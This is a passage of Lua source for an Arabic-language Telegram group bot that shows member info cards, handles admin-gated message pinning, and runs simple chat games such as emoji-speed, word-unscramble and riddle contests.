sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"🎥 ※ "..king_text[king3].."\n🎟 ※ ايديك ✓ "..msg.sender_user_id_.."\n🎫 ※ يوزرك ✓"..king_info.."\n🛰 ※ موقعك ✓ "..t.."\n📖 ※ رسائلك ✓("..user_msgs..")\n🗃 ※ سحكاتك ✓("..edit..")\n📓 ※ تفاعلك ✓ ("..iking_text..")\n🤹🏻‍♂️ ※ مجوهراتك ✓ ("..nko..")\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ",msg.id_,msg.id_.."")
else 
local fayomy_new_text = database:get("fayomy:gr:id:text:"..bot_id..msg.chat_id_)
local fayomy_new_text = fayomy_new_text:gsub('#username',(king_info or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#edit',(edit or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#stast',(t or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#auto',(iking_text or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#photos',(all_photo_fayomy or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#game',(nko or 'لا يوجد'))

sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,fayomy_new_text,msg.id_,msg.id_.."")
end
else
if msg.sender_user_id_ == tonumber(sudo_add) then
t = 'المطور الاساسي 👨🏻‍🔧'
elseif is_sudo(msg) then
t = database:get("fayomy:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت 👨🏻‍💻'
elseif is_creatorbasic(msg) then
t = database:get("fayomy:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍🚀'
elseif (database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("fayomy:all_if:"..database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_creator(msg) then
t = database:get("fayomy:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب 👨🏻‍✈️'
elseif (database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("fayomy:all_if:"..database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_owner(msg) then
t = database:get("fayomy:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب 🤵🏻'
elseif is_mod(msg) then
t = database:get("fayomy:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب👩🏿‍🚒'
elseif is_vip(msg) then
t = database:get("fayomy:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز 🧙🏻‍♂'
else
t = database:get("fayomy:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
end
if not database:get("fayomy:gr:id:text:"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, "🎟 ※ ايديك ✓ ("..msg.sender_user_id_..")\n🎫 ※ يوزرك ✓ "..king_info.."\n🛰 ※ موقعك ✓"..t.."\n📖 ※ رسائلك ✓("..user_msgs..")\n🗃 ※ سحكاتك ✓ ("..edit..")\n📓 ※ تفاعلك ✓ "..iking_text.."\n🤹🏻‍♂️ ※ مجوهراتك ✓  ("..nko..")\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ", 1, 'html')
else 
local fayomy_new_text = database:get("fayomy:gr:id:text:"..bot_id..msg.chat_id_)
local fayomy_new_text = fayomy_new_text:gsub('#username',(king_info or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#edit',(edit or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#stast',(t or 'لا يوجد'))   
local fayomy_new_text = fayomy_new_text:gsub('#auto',(iking_text or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#photos',(all_photo_fayomy or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#game',(nko or 'لا يوجد'))

send(msg.chat_id_, msg.id_, 1, fayomy_new_text, 1, 'html')
end   
end
else
end
else
if msg.sender_user_id_ == tonumber(sudo_add) then
t = 'المطور الاساسي 👨🏻‍🔧'
elseif is_sudo(msg) then
t = database:get("fayomy:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت 👨🏻‍💻'
elseif is_creatorbasic(msg) then
t = database:get("fayomy:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍🚀'
elseif (database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("fayomy:all_if:"..database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_creator(msg) then
t = database:get("fayomy:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب 👨🏻‍✈️'
elseif (database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("fayomy:all_if:"..database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_owner(msg) then
t = database:get("fayomy:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب 🤵🏻'
elseif is_mod(msg) then
t = database:get("fayomy:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب👩🏿‍🚒'
elseif is_vip(msg) then
t = database:get("fayomy:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز 🧙🏻‍♂'
else
t = database:get("fayomy:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
end
if not database:get('fayomy:'..bot_id..'id:mute'..msg.chat_id_) then
if not database:get('fayomy:'..bot_id..'id:photo'..msg.chat_id_) then
if not database:get("fayomy:gr:id:text:"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1,"🎥 ※ انت لا تملك صوره لحسابك !\n🎟 ※ ايديك ✓ "..msg.sender_user_id_.."\n🎫 ※ يوزرك ✓ "..king_info.."\n🛰 ※ موقعك ✓  "..t.."\n📖 ※ رسائلك ✓ ("..user_msgs..")\n🗃 ※ سحكاتك ✓("..edit..")\n📓 ※ تفاعلك ✓"..iking_text.."\n🤹🏻‍♂️ ※ مجوهراتك ✓ ("..nko..")\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ", 1, 'html')
else 
local fayomy_new_text = database:get("fayomy:gr:id:text:"..bot_id..msg.chat_id_)
local fayomy_new_text = fayomy_new_text:gsub('#username',(king_info or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#edit',(edit or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#stast',(t or 'لا يوجد'))   
local fayomy_new_text = fayomy_new_text:gsub('#auto',(iking_text or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#photos',(all_photo_fayomy or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#game',(nko or 'لا يوجد'))

send(msg.chat_id_, msg.id_, 1, fayomy_new_text, 1, 'html')
end
else
if msg.sender_user_id_ == tonumber(sudo_add) then
t = 'المطور الاساسي 👨🏻‍🔧'
elseif is_sudo(msg) then
t = database:get("fayomy:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت 👨🏻‍💻'
elseif is_creatorbasic(msg) then
t = database:get("fayomy:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍🚀'
elseif (database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("fayomy:all_if:"..database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_creator(msg) then
t = database:get("fayomy:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب 👨🏻‍✈️'
elseif (database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("fayomy:all_if:"..database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
t = database:get("fayomy:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
elseif is_owner(msg) then
t = database:get("fayomy:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب 🤵🏻'
elseif is_mod(msg) then
t = database:get("fayomy:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب👩🏿‍🚒'
elseif is_vip(msg) then
t = database:get("fayomy:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز 🧙🏻‍♂'
else
t = database:get("fayomy:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
end
if not database:get("fayomy:gr:id:text:"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1,"🎟 ※ ايديك ✓ ("..msg.sender_user_id_..")\n🎫 ※ يوزرك ✓ "..king_info.."\n🛰 ※ موقعك ✓ "..t.."\n📖 ※ رسائلك ✓ {"..user_msgs..")\n🗃 ※ سحكاتك ✓("..edit..")\n📓 ※ تفاعلك ✓ "..iking_text.."\n🤹🏻‍♂️ ※ مجوهراتك ✓ ("..nko..")\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ", 1, 'html')
else 
local fayomy_new_text = database:get("fayomy:gr:id:text:"..bot_id..msg.chat_id_)
local fayomy_new_text = fayomy_new_text:gsub('#username',(king_info or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#edit',(edit or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#stast',(t or 'لا يوجد'))   
local fayomy_new_text = fayomy_new_text:gsub('#auto',(iking_text or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#photos',(all_photo_fayomy or 'لا يوجد'))
local fayomy_new_text = fayomy_new_text:gsub('#game',(nko or 'لا يوجد'))

send(msg.chat_id_, msg.id_, 1, fayomy_new_text, 1, 'html')  
end 
end
else
end
end
end
tdcli_function ({
ID = "GetUserProfilePhotos",
user_id_ = msg.sender_user_id_,
offset_ = 0,
limit_ = 1
}, getpro, nil)
end
getUser(msg.sender_user_id_, king333)
end
end
if text then
if database:sismember('fayomy:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_,text) then
else
database:del('fayomy:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_) 
end
end
if text:match('^الحساب (%d+)$') then
local id = text:match('^الحساب (%d+)$')
local text = 'اضغط لمشاهده الحساب'
tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil)
end
local function oChat(chat_id,cb)
tdcli_function ({
ID = "OpenChat",
chat_id_ = chat_id
}, cb, nil)
end
if text:match("^معلومات (.*)$") then
local memb = {string.match(text, "^(معلومات) (.*)$")}
function whois(extra,result,success)
if result.username_ then
result.username_ = '@'..result.username_
else
result.username_ = 'لا يوجد معرف'
end
send(msg.chat_id_, msg.id_, 1, '📜┇معرف ~⪼ ('..(result.username_..')\n🔘┇الاسم ~⪼ ('..result.first_name_ or "fayomy")..')', 1, 'md')
end
getUser(memb[2],whois)
end
if (text and text == 'تفعيل التثبيت') and (is_owner(msg) or is_creatorbasic(msg)) then
if not database:get('fayomy:'..bot_id..'pin:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '☑┇التثبيت بالفعل تم تفعيله', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم تفعيل التثبيت', 1, 'md')
database:del('fayomy:'..bot_id..'pin:mute'..msg.chat_id_)
end
end
if (text and text == 'تعطيل التثبيت') and (is_owner(msg) or is_creatorbasic(msg)) then
if database:get('fayomy:'..bot_id..'pin:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '☑┇التثبيت بالفعل تم تعطيله', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇تم تعطيل التثبيت', 1, 'md')
database:set('fayomy:'..bot_id..'pin:mute'..msg.chat_id_,true)
end
end
if text:match("^تثبيت$") and (is_mod(msg) or is_creatorbasic(msg)) and not is_owner(msg) then
local id = msg.id_
local msgs = {[0] = id}
if not database:get('fayomy:'..bot_id..'pin:mute'..msg.chat_id_) then
pin(msg.chat_id_,msg.reply_to_message_id_,0)
database:set('fayomy:'..bot_id..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
send(msg.chat_id_, msg.id_, 1, '⚜️※ تم تثبيت الرسالة  ✓',1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇التثبيت معطل',1, 'md')
end
end
if text:match("^الغاء تثبيت$") and (is_mod(msg) or is_creatorbasic(msg)) and not is_owner(msg) or text:match("^الغاء التثبيت") and (is_mod(msg) or is_creatorbasic(msg)) and not is_owner(msg) then
if not database:get('fayomy:'..bot_id..'pin:mute'..msg.chat_id_) then
unpinmsg(msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '☑┇تم الغاء تثبيت الرساله', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '☑┇الغاء التثبيت معطل', 1, 'md')
end
end
if text:match("^تثبيت$") and (is_owner(msg) or is_creatorbasic(msg)) then
local id = msg.id_
local msgs = {[0] = id}
pin(msg.chat_id_,msg.reply_to_message_id_,0)
database:set('fayomy:'..bot_id..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
send(msg.chat_id_, msg.id_, 1, '⚜️※ تم تثبيت الرسالة  ✓',1, 'md')
end
if text:match("^الغاء تثبيت$") and (is_owner(msg) or is_creatorbasic(msg)) or text:match("^الغاء التثبيت") and (is_owner(msg) or is_creatorbasic(msg)) then
unpinmsg(msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '☑┇تم الغاء تثبيت الرساله', 1, 'md')
end
if text:match("^مشاهده منشور$") then
database:set('fayomy:'..bot_id..'viewget'..msg.sender_user_id_,true)
send(msg.chat_id_, msg.id_, 1, '📥┇قم بارسال المنشور الان ',1, 'md')
end
if (text and text == 'استعاده الاوامر') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
redis:del('fayomy:'..bot_id..'help', text)
redis:del('fayomy:'..bot_id..'h1', text)
redis:del('fayomy:'..bot_id..'h2', text)
redis:del('fayomy:'..bot_id..'h3', text)
redis:del('fayomy:'..bot_id..'h4', text)
redis:del('fayomy:'..bot_id..'h5', text)
redis:del('fayomy:'..bot_id..'h6', text)
send(msg.chat_id_, msg.id_, 1, '☑┇تم استعاده جميع كلايش الاوامر', 1, 'html')
end
if (text and text == 'تغير امر الاوامر') and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
send(msg.chat_id_, msg.id_, 1, '📥┇الان يمكنك ارسال الكليشه  ليتم حفظها', 1, 'html')
redis:set('fayomy:'..bot_id..'hhh'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local king2 = redis:get('fayomy:'..bot_id..'hhh'..msg.sender_user_id_..'')
if king2 == 'msg' then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حفظ الكليشه يمكنك اظهارها بارسال الامر', 1, 'html')
redis:set('fayomy:'..bot_id..'hhh'..msg.sender_user_id_..'', 'no')
redis:set('fayomy:'..bot_id..'help', text)
send(msg.chat_id_, msg.id_, 1, text , 1, 'html')
return false end
end
---------------
if text == 'سمايلات' and database:get('fayomy:'..bot_id..'lock_geam'..msg.chat_id_) then
database:del('fayomy:'..bot_id..'l:ids'..msg.chat_id_)
katu = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🎲','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🎟','🎫','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔','🛡','🔮','🌡','💣','📌','📍','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = katu[math.random(#katu)]
database:set('fayomy:'..bot_id..'klmos'..msg.chat_id_,name)
name = string.gsub(name,'🍞','🍞')
name = string.gsub(name,'🥖','🥖')
name = string.gsub(name,'🥨','🥨')
name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚')
name = string.gsub(name,'🍳','🍳')
name = string.gsub(name,'🥞','🥞')
name = string.gsub(name,'🥓','🥓')
name = string.gsub(name,'🥩','🥩')
name = string.gsub(name,'🍗','🍗')
name = string.gsub(name,'🍖','🍖')
name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔')
name = string.gsub(name,'🍟','🍟')
name = string.gsub(name,'🍕','🍕')
name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙')
name = string.gsub(name,'🍼','🍼')
name = string.gsub(name,'☕️','☕️')
name = string.gsub(name,'🍵','🍵')
name = string.gsub(name,'🥤','🥤')
name = string.gsub(name,'🍶','🍶')
name = string.gsub(name,'🍺','🍺')
name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎')
name = string.gsub(name,'🍐','🍐')
name = string.gsub(name,'🍊','🍊')
name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌')
name = string.gsub(name,'🍉','🍉')
name = string.gsub(name,'🍇','🍇')
name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈')
name = string.gsub(name,'🍒','🍒')
name = string.gsub(name,'🍑','🍑')
name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥')
name = string.gsub(name,'🥝','🥝')
name = string.gsub(name,'🍅','🍅')
name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑')
name = string.gsub(name,'🥦','🥦')
name = string.gsub(name,'🥒','🥒')
name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽')
name = string.gsub(name,'🥕','🥕')
name = string.gsub(name,'🥔','🥔')
name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐')
name = string.gsub(name,'🍻','🍻')
name = string.gsub(name,'🏀','🏀')
name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈')
name = string.gsub(name,'⚾️','⚾️')
name = string.gsub(name,'🎾','🎾')
name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','🏉')
name = string.gsub(name,'🎱','🎱')
name = string.gsub(name,'🏓','🏓')
name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅')
name = string.gsub(name,'🎰','🎰')
name = string.gsub(name,'🎮','🎮')
name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯')
name = string.gsub(name,'🎲','🎲')
name = string.gsub(name,'🎻','🎻')
name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺')
name = string.gsub(name,'🥁','🥁')
name = string.gsub(name,'🎹','🎹')
name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧')
name = string.gsub(name,'🎤','🎤')
name = string.gsub(name,'🎬','🎬')
name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'🎭','🎭')
name = string.gsub(name,'🎪','🎪')
name = string.gsub(name,'🎟','🎟')
name = string.gsub(name,'🎫','🎫')
name = string.gsub(name,'🎗','🎗')
name = string.gsub(name,'🏵','🏵')
name = string.gsub(name,'🎖','🎖')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🥌','🥌')
name = string.gsub(name,'🛷','🛷')
name = string.gsub(name,'🚕','🚕')
name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙')
name = string.gsub(name,'🚌','🚌')
name = string.gsub(name,'🚎','🚎')
name = string.gsub(name,'🏎','🏎')
name = string.gsub(name,'🚓','🚓')
name = string.gsub(name,'🚑','🚑')
name = string.gsub(name,'🚚','🚚')
name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜')
name = string.gsub(name,'🇮🇶','🇮🇶')
name = string.gsub(name,'⚔','⚔')
name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮')
name = string.gsub(name,'🌡','🌡')
name = string.gsub(name,'💣','💣')
name = string.gsub(name,'📌','📌')
name = string.gsub(name,'📍','📍')
name = string.gsub(name,'📓','📒')
name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📂','🗂')
name = string.gsub(name,'📅','📆')
name = string.gsub(name,'📪','📪')
name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬')
name = string.gsub(name,'📭','📭')
name = string.gsub(name,'⏰','⏰')
name = string.gsub(name,'📺','📺')
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
taha = '🚀¦اسرع واحد يدز » {`'..name..'`}'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
end
if text == ''..(database:get('fayomy:'..bot_id..'klmos'..msg.chat_id_) or 'لفاتع')..'' and not database:get('fayomy:'..bot_id..'l:ids'..msg.chat_id_) then
if not database:get('fayomy:'..bot_id..'l:ids'..msg.chat_id_) then 
taha = '*👾| مبروك لقد فزت ,\n👨🏽‍💻| لعب مره اخره ارسل سمايلات ,*'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
database:incrby('fayomy:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
database:incrby('fayomy:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    

end
database:set('fayomy:'..bot_id..'l:ids'..msg.chat_id_,true)
end 
if text == 'الاسرع' and database:get('fayomy:'..bot_id..'lock_geam'..msg.chat_id_) then
database:del('fayomy:'..bot_id..'l:id'..msg.chat_id_)
katu = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = katu[math.random(#katu)]
database:set('fayomy:'..bot_id..'klmo'..msg.chat_id_,name)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
taha = '🚀¦اسرع واحد يرتبها » {'..name..'}'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
end
if text == ''..(database:get('fayomy:'..bot_id..'klmo'..msg.chat_id_) or 'لفاتع')..'' and not database:get('fayomy:'..bot_id..'l:id'..msg.chat_id_) then
if not database:get('fayomy:'..bot_id..'l:id'..msg.chat_id_) then 
taha = '*👾| مبروك لقد فزت ,\n👨🏽‍💻| لعب مره اخره ارسل الاسرع ,*'
send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
database:incrby('fayomy:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1) 
database:incrby('fayomy:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    

end
database:set('fayomy:'..bot_id..'l:id'..msg.chat_id_,true)
end 
if text == 'حزوره' and database:get('fayomy:'..bot_id..'lock_geam'..msg.chat_id_) then
database:del('fayomy:'..bot_id..'l:id1'..msg.chat_id_)
katu = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = katu[math.random(#katu)]
database:set('fayomy:'..bot_id..'klmoa'..msg.chat_id_,name)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ')
name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟')
name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟')
name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ')
name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ')
name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟')
name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'غلط','ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ')
name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟')
name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ')
name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
